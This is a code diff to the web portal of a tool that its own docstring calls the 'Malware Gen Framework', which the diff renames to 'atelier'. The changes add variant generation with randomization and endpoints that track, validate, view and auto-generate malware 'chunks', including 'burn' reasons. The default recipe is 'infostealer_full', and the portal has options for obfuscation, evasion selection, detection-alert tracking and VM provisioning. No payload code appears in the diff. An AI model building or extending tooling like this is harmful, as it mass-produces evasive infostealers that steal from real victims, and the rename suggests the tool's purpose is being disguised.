@@ -1,7 +1,7 @@
 """
 Web portal for the Malware Gen Framework.
 
-Launched via:  python -m malware_gen_framework portal [--port 7070]
+Launched via:  python -m atelier portal [--port 7070]
 """
 import asyncio
 import json
@@ -27,7 +27,7 @@ HERMES_SESSIONS_DIR = Path(__file__).parent / "hermes_sessions"
 # ---------------------------------------------------------------------------
 
 def build_command(data: dict) -> list[str]:
-    cmd = [sys.executable, "-m", "malware_gen_framework"]
+    cmd = [sys.executable, "-m", "atelier"]
     command = data.get("command", "run")
     cmd.append(command)
 
@@ -633,11 +633,11 @@ async def handle_chunk_build(request: web.Request) -> web.Response:
         custom_path = RESULTS_DIR / "custom_recipe.yaml"
         custom_path.parent.mkdir(parents=True, exist_ok=True)
         custom_path.write_text(recipe_yaml)
-        cmd = [sys.executable, "-m", "malware_gen_framework", "chunk",
+        cmd = [sys.executable, "-m", "atelier", "chunk",
                "--recipe", str(custom_path)]
     else:
         recipe = data.get("recipe", "infostealer_full")
-        cmd = [sys.executable, "-m", "malware_gen_framework", "chunk",
+        cmd = [sys.executable, "-m", "atelier", "chunk",
                "--recipe", recipe]
 
     if compile_flag:
@@ -647,8 +647,15 @@ async def handle_chunk_build(request: web.Request) -> web.Response:
     if obf_level and obf_level != "none":
         cmd.extend(["--obfuscate", obf_level])
 
+    # Variant generation support
+    variants = data.get("variants", 1)
+    if variants and variants > 1:
+        cmd.extend(["--variants", str(variants)])
+    if data.get("randomize", False):
+        cmd.append("--randomize")
+
     deploy = data.get("deploy", False)
-    if deploy:
+    if deploy and variants == 1:  # Only allow deploy for single variant
         cmd.append("--test")
 
     env_extra = {}
@@ -758,6 +765,180 @@ async def handle_chunk_history(request: web.Request) -> web.Response:
     es = _load_evasion_selector()
     history = es.load_history()
     return web.json_response(history)
+
+
+# ---------------------------------------------------------------------------
+# Chunk Registry endpoints
+# ---------------------------------------------------------------------------
+
+def _load_chunk_registry():
+    """Load chunk registry module."""
+    import sys
+    sys.path.insert(0, str(CHUNKS_DIR))
+    from registry import (load_registry, save_registry, get_chunk_meta,
+                          set_chunk_status, summary, get_new_chunks,
+                          get_disabled_chunks, list_by_category)
+    return {
+        "load": load_registry,
+        "save": save_registry,
+        "get_meta": get_chunk_meta,
+        "set_status": set_chunk_status,
+        "summary": summary,
+        "get_new": get_new_chunks,
+        "get_disabled": get_disabled_chunks,
+        "list_by_category": list_by_category,
+    }
+
+
+async def handle_chunk_registry_list(request: web.Request) -> web.Response:
+    """List all chunks with their registry status."""
+    try:
+        reg = _load_chunk_registry()
+        registry = reg["load"]()
+        stats = reg["summary"](registry)
+        new_chunks = reg["get_new"](registry=registry)
+        disabled = reg["get_disabled"](registry=registry)
+
+        # Build categorized list
+        chunks_by_category = {}
+        for chunk_ref, meta in registry.get("chunks", {}).items():
+            category = chunk_ref.split("/")[0] if "/" in chunk_ref else "other"
+            if category not in chunks_by_category:
+                chunks_by_category[category] = []
+            chunks_by_category[category].append({
+                "ref": chunk_ref,
+                "name": chunk_ref.split("/")[-1],
+                "status": meta.get("status", "enabled"),
+                "tags": meta.get("tags", []),
+                "created_at": meta.get("created_at"),
+                "disabled_at": meta.get("disabled_at"),
+                "burn_reason": meta.get("burn_reason"),
+                "last_validated": meta.get("last_validated"),
+                "note": meta.get("note"),
+                "is_new": chunk_ref in new_chunks,
+            })
+
+        return web.json_response({
+            "stats": stats,
+            "new_chunks": new_chunks,
+            "disabled": [{"ref": ref, "reason": reason} for ref, reason in disabled],
+            "chunks_by_category": chunks_by_category,
+        })
+    except Exception as e:
+        return web.json_response({"error": str(e)}, status=500)
+
+
+async def handle_chunk_registry_update(request: web.Request) -> web.Response:
+    """Update a chunk's status/tags."""
+    chunk_ref = request.match_info["chunk"]
+    try:
+        data = await request.json()
+    except Exception:
+        return web.json_response({"error": "invalid JSON"}, status=400)
+
+    try:
+        reg = _load_chunk_registry()
+        status = data.get("status")
+        reason = data.get("reason")
+        tags = data.get("tags")
+
+        if status:
+            reg["set_status"](chunk_ref, status, reason=reason, tags=tags)
+
+        meta = reg["get_meta"](chunk_ref)
+        return web.json_response({"chunk": chunk_ref, "meta": meta})
+    except Exception as e:
+        return web.json_response({"error": str(e)}, status=500)
+
+
+async def handle_chunk_source(request: web.Request) -> web.Response:
+    """Get the source code of a chunk."""
+    chunk_ref = request.match_info["chunk"]
+    # Try to find the chunk file
+    for ext in [".c", ".js", ".vbs", ".bat"]:
+        chunk_path = CHUNKS_DIR / f"{chunk_ref}{ext}"
+        if chunk_path.exists():
+            return web.Response(text=chunk_path.read_text(), content_type="text/plain")
+    return web.json_response({"error": f"Chunk not found: {chunk_ref}"}, status=404)
+
+
+async def handle_chunk_validate(request: web.Request) -> web.Response:
+    """Start a chunk validation job."""
+    try:
+        data = await request.json()
+    except Exception:
+        return web.json_response({"error": "invalid JSON"}, status=400)
+
+    job_id = uuid.uuid4().hex[:8]
+    cmd = [sys.executable, str(FRAMEWORK_ROOT / "validate.py")]
+
+    if data.get("recipe"):
+        cmd.extend(["--recipe", data["recipe"]])
+    if data.get("category"):
+        cmd.extend(["--category", data["category"]])
+    if data.get("chunks"):
+        cmd.extend(["--chunks", data["chunks"]])
+    if data.get("thorough"):
+        cmd.append("--thorough")
+    if data.get("update_registry"):
+        cmd.append("--update-registry")
+
+    jobs[job_id] = {
+        "id": job_id,
+        "status": "running",
+        "cmd": cmd,
+        "cmd_str": " ".join(cmd),
+        "command": "validate",
+        "output": [],
+        "listeners": [],
+        "proc": None,
+        "exit_code": None,
+        "paused": False,
+    }
+    asyncio.create_task(_run_subprocess(job_id, cmd))
+
+    return web.json_response({"job_id": job_id, "cmd_str": " ".join(cmd)})
+
+
+async def handle_chunk_expand(request: web.Request) -> web.Response:
+    """Start a chunk expansion job."""
+    try:
+        data = await request.json()
+    except Exception:
+        return web.json_response({"error": "invalid JSON"}, status=400)
+
+    chunk_type = data.get("type")
+    description = data.get("description")
+    if not chunk_type or not description:
+        return web.json_response({"error": "type and description required"}, status=400)
+
+    job_id = uuid.uuid4().hex[:8]
+    cmd = [sys.executable, str(FRAMEWORK_ROOT / "expand.py"),
+           "--type", chunk_type,
+           "--description", description]
+
+    if data.get("count", 1) > 1:
+        cmd.extend(["--count", str(data["count"])])
+    if data.get("validate"):
+        cmd.append("--validate")
+    if data.get("max_attempts"):
+        cmd.extend(["--max-attempts", str(data["max_attempts"])])
+
+    jobs[job_id] = {
+        "id": job_id,
+        "status": "running",
+        "cmd": cmd,
+        "cmd_str": " ".join(cmd),
+        "command": "expand",
+        "output": [],
+        "listeners": [],
+        "proc": None,
+        "exit_code": None,
+        "paused": False,
+    }
+    asyncio.create_task(_run_subprocess(job_id, cmd))
+
+    return web.json_response({"job_id": job_id, "cmd_str": " ".join(cmd)})
 
 
 # ---------------------------------------------------------------------------
@@ -1086,7 +1267,7 @@ async def handle_vm_boot(request: web.Request) -> web.Response:
         return web.json_response(
             {"error": "VM is already running."}, status=409)
 
-    from .provision_engine import QEMUProcess, ProvisionEngine
+    from atelier.provision_engine import QEMUProcess, ProvisionEngine
 
     qemu = QEMUProcess(
         vm_name=vm_name, qmp_socket=qmp, disk_img=cow,
@@ -1145,7 +1326,7 @@ async def handle_vm_shutdown(request: web.Request) -> web.Response:
         await asyncio.sleep(1)
 
     # Force kill
-    from .provision_engine import QEMUProcess
+    from atelier.provision_engine import QEMUProcess
     await asyncio.to_thread(QEMUProcess._kill_stale_qemu, vm_name, qmp)
     _vm_qemu = None
     return web.json_response({"ok": True, "forced": True})
@@ -1176,7 +1357,7 @@ async def handle_vm_install(request: web.Request) -> web.Response:
     data = await request.json() if request.content_length else {}
     os_name = data.get("os", "windows-11")
     job_id = uuid.uuid4().hex[:8]
-    cmd = [sys.executable, "-m", "malware_gen_framework", "provision",
+    cmd = [sys.executable, "-m", "atelier", "provision",
            "--os", os_name]
     jobs[job_id] = {
         "id": job_id, "status": "running", "cmd": cmd,
@@ -2192,6 +2373,11 @@ def create_app() -> web.Application:
     app.router.add_post("/api/chunk/build", handle_chunk_build)
     app.router.add_post("/api/chunk/hybrid", handle_chunk_hybrid)
     app.router.add_get("/api/chunk/history", handle_chunk_history)
+    app.router.add_get("/api/chunk/registry", handle_chunk_registry_list)
+    app.router.add_put("/api/chunk/registry/{chunk:.*}", handle_chunk_registry_update)
+    app.router.add_get("/api/chunk/source/{chunk:.*}", handle_chunk_source)
+    app.router.add_post("/api/chunk/validate", handle_chunk_validate)
+    app.router.add_post("/api/chunk/expand", handle_chunk_expand)
     app.router.add_get("/api/detection/status", handle_detection_status)
     app.router.add_get("/api/detection/alerts", handle_detection_alerts)
     app.router.add_get("/ws/ssh", handle_ssh_ws)
